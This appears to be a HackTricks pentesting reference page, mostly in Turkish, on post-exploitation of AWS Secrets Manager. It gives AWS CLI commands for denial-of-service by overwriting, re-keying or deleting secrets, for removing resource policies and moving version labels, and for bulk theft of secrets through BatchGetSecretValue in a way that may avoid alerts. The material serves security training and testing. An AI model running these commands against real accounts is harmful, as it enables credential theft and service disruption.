# AWS - Secrets Manager Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Secrets Okuma

The **Secrets kendileri hassas bilgilerdir**, nasıl okunacağını öğrenmek için [privesc sayfasına bakın](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md).

### DoS: Secret Değerini Değiştirme

Secret'in değerini değiştirerek, **o değere bağımlı tüm sistemleri DoS edebilirsiniz.**

> [!WARNING]
> Önceki değerlerin de saklandığını unutmayın, bu yüzden önceki değere geri dönmek kolaydır.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

Eğer saldırganın secretsmanager:UpdateSecret izni varsa, secret'i saldırganın sahip olduğu bir KMS key kullanacak şekilde yapılandırabilir. Bu anahtar başlangıçta herkesin erişip kullanabilmesi için ayarlanmıştır, bu yüzden secret'i yeni anahtar ile güncellemek mümkündür. Anahtara erişilemiyor olsaydı, secret güncellenemezdi.

Secret için anahtarı değiştirdikten sonra saldırgan, anahtarın yapılandırmasını yalnızca kendisinin erişebileceği şekilde değiştirir. Böylece secret'in sonraki versiyonları yeni anahtarla şifrelenecek ve anahtara erişim olmadığından secret'i almak imkânsız hale gelir.

Önemli bir nokta: erişilemezlik yalnızca secret içeriği değiştikten sonra, yani sonraki versiyonlarda meydana gelir; çünkü mevcut versiyon hala orijinal KMS key ile şifrelenmiştir.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Secret Silme

Bir secret'i silmek için gereken minimum gün sayısı 7'dir
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

Bir secret'i geri yüklemek mümkündür; bu, silinmek üzere planlanmış secret'lerin geri yüklenmesine olanak tanır, çünkü secret'ler için minimum silme süresi 7 gün ve maksimum 30 gündür. secretsmanager:GetSecretValue izni ile birlikte, bunların içeriklerini almayı mümkün kılar.

Silinme sürecinde olan bir secret'i kurtarmak için aşağıdaki komutu kullanabilirsiniz:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

Bu eylem, bir secret'e kimlerin erişebileceğini kontrol eden resource policy'yi silmeye izin verir. Resource policy, erişimi belirli bir kullanıcı grubuna izin verecek şekilde yapılandırıldıysa bu bir DoS'a yol açabilir.

Resource policy'yi silmek için:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Bir secret'in durumları, secret sürümlerini yönetmek için kullanılır. AWSCURRENT uygulamaların kullandığı aktif sürümü işaretler, AWSPREVIOUS gerektiğinde geri dönebileceğiniz önceki sürümü saklar ve AWSPENDING yeni bir sürümü şu anki yapmadan önce hazırlamak ve doğrulamak için rotasyon sürecinde kullanılır.

Uygulamalar her zaman AWSCURRENT etiketine sahip sürümü okur. Birisi bu etiketi yanlış bir sürüme taşırsa, uygulamalar geçersiz kimlik bilgileri kullanır ve başarısız olabilir.

AWSPREVIOUS otomatik olarak kullanılmaz. Ancak AWSCURRENT kaldırılır veya yanlış atanırsa, her şeyin hâlâ önceki sürümle çalıştığı izlenimi oluşabilir.
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../../banners/hacktricks-training.md}}





### Mass Secret Exfiltration via BatchGetSecretValue (up to 20 per call)

Secrets Manager BatchGetSecretValue API'sını suistimal ederek tek bir istekte en fazla 20 secret alabilirsiniz. Bu, her secret için GetSecretValue çağrısını tekrarlamaya kıyasla API çağrısı sayısını önemli ölçüde azaltır. Eğer filtreler kullanılıyorsa (tags/name), ListSecrets izni de gereklidir. CloudTrail yine de batch içinde alınan her secret için bir GetSecretValue olayı kaydeder.

Gerekli izinler
- secretsmanager:BatchGetSecretValue
- her hedef secret için secretsmanager:GetSecretValue
- --filters kullanılıyorsa secretsmanager:ListSecrets
- secret'lerde kullanılan CMK'ler üzerinde kms:Decrypt (aws/secretsmanager kullanılmıyorsa)

> [!WARNING]
> `secretsmanager:BatchGetSecretValue` izninin secretleri almak için tek başına yeterli olmadığını unutmayın; almak istediğiniz her secret için ayrıca `secretsmanager:GetSecretValue` iznine ihtiyacınız vardır.

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Filtrelere göre Exfiltrate (tag key/value veya name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
Kısmi başarısızlıkların ele alınması
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
Etkiler
- Daha az API çağrısıyla birçok sırın hızlı “smash-and-grab” ile alınması; bu, GetSecretValue dalgalanmalarına göre ayarlanmış uyarıları atlatabilir.
- CloudTrail günlükleri, toplu işlemle alınan her sır için hâlâ bir GetSecretValue olayı içerir.
